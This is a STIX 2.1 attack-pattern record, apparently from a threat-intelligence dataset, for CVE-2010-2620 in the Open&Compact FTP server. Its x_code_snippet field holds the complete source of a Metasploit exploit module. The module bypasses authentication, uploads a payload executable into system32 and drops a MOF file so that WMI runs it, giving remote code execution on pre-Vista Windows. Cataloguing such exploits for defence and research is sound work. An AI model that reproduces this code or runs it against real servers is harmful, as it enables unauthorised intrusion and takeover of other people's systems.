{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8911407b-b077-47a6-8cd8-d92963e02345",
    "created": "2024-08-14T16:51:02.589937Z",
    "modified": "2024-08-14T16:51:02.589941Z",
    "name": "\"Open-FTPD 1.2 Arbitrary File Upload\"",
    "description": " This module exploits multiple vulnerabilities found in Open&Compact FTP server. The software contains an authentication bypass vulnerability and a arbitrary file upload vulnerability that allows a remote attacker to write arbitrary files to the file system as long as there is at least one user who has permission.  Code execution can be achieved by first uploading the payload to the remote machine as an exe file, and then upload another mof file, which enables WMI (Management Instrumentation service) to execute the uploaded payload. Please note that this module currently only works for Windows before Vista.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/open_ftpd_wbem.rb",
            "external_id": "open_ftpd_wbem.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2620"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Ftp\n        include Msf::Exploit::Remote::TcpServer\n        include Msf::Exploit::EXE\n        include Msf::Exploit::WbemExec\n        include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Open-FTPD 1.2 Arbitrary File Upload\",\n      'Description'    => %q{\n        This module exploits multiple vulnerabilities found in Open&Compact FTP\n        server. The software contains an authentication bypass vulnerability and a\n        arbitrary file upload vulnerability that allows a remote attacker to write\n        arbitrary files to the file system as long as there is at least one user\n        who has permission.\n\n        Code execution can be achieved by first uploading the payload to the remote\n        machine as an exe file, and then upload another mof file, which enables\n        WMI (Management Instrumentation service) to execute the uploaded payload.\n        Please note that this module currently only works for Windows before Vista.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Serge Gorbunov', # Initial discovery\n          'bcoles', # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '65687'],\n          ['EDB',   '13932'],\n          ['CVE',   '2010-2620']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Targets'        =>\n        [\n          # Tested on version 1.2 - Windows XP SP3 (EN)\n          ['Open&Compact FTP 1.2 on Windows (Before Vista)', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-06-18',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptString.new('PATH',  [true, 'The local Windows path', \"C:/WINDOWS/\"]),\n      OptPort.new('SRVPORT', [true, 'The local port to listen on for active mode', 8080])\n    ])\n    deregister_options('FTPUSER', 'FTPPASS') # Using authentication bypass\n\n  end\n\n  def check\n    connect\n    disconnect\n\n    if banner =~ /\\*\\*        Welcome on       \\*\\*/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def on_client_connect(cli)\n    peer = \"#{cli.peerhost}:#{cli.peerport}\"\n\n    case @stage\n    when :exe\n      print_status(\"Sending executable (#{@exe.length.to_s} bytes)\")\n      cli.put(@exe)\n      @stage = :mof\n    when :mof\n      print_status(\"Sending MOF (#{@mof.length.to_s} bytes)\")\n      cli.put(@mof)\n    end\n\n    cli.close\n  end\n\n  # Largely stolen from freefloatftp_wbem.rb\n  def upload(filename)\n    select(nil, nil, nil, 1)\n\n    peer = \"#{rhost}:#{rport}\"\n    print_status(\"Trying to upload #{::File.basename(filename)}\")\n    conn = connect(false, datastore['VERBOSE'])\n    if not conn\n      fail_with(Failure::Unreachable, \"#{@peer} - Connection failed\")\n    end\n\n    # Switch to binary mode\n    print_status(\"Set binary mode\")\n    send_cmd(['TYPE', 'I'], true, conn)\n\n    # Prepare active mode: Get attacker's IP and source port\n    src_ip   = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']\n    src_port = datastore['SRVPORT'].to_i\n\n    # Prepare active mode: Convert the IP and port for active mode\n    src_ip   = src_ip.gsub(/\\./, ',')\n    src_port = \"#{src_port/256},#{src_port.remainder(256)}\"\n\n    # Set to active mode\n    print_status(\"Set active mode \\\"#{src_ip},#{src_port}\\\"\")\n    send_cmd(['PORT', \"#{src_ip},#{src_port}\"], true, conn)\n\n    # Tell the FTP server to download our file\n    send_cmd(['STOR', filename], false, conn)\n\n    print_good(\"Upload successful\")\n    disconnect(conn)\n  end\n\n  # Largely stolen from freefloatftp_wbem.rb\n  def exploit\n    path     = datastore['PATH']\n    exe_name = \"#{path}/system32/#{rand_text_alpha(rand(10)+5)}.exe\"\n    mof_name = \"#{path}/system32/wbem/mof/#{rand_text_alpha(rand(10)+5)}.mof\"\n    @mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))\n    @exe      = generate_payload_exe\n    @stage = :exe\n\n    begin\n      t = framework.threads.spawn(\"reqs\", false) {\n        begin\n          # Upload our malicious executable\n          u = upload(exe_name)\n          # Upload the mof file\n          upload(mof_name) if u\n          register_file_for_cleanup(\"#{::File.basename(exe_name)}\")\n          register_file_for_cleanup(\"wbem\\\\mof\\\\good\\\\#{::File.basename(mof_name)}\")\n        rescue ::Exception => e\n          print_error \"Upload Failed: #{e.message}\"\n          cleanup\n        end\n      }\n\n      super\n    ensure\n      t.kill\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-18",
    "x_mitre_platforms": [
        "win'"
    ]
}